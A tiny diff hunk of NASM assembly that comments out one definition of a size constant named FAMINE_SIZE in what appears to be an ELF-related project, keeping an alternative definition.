@@ -11,7 +11,7 @@
 %define MAPPED_FILE 8
 
 
-%define FAMINE_SIZE _v_stop - _famine
+;%define FAMINE_SIZE _v_stop - _famine
 %define FAMINE_SIZE _end - _famine
 
 ; ELF_HDR_DEFINITION
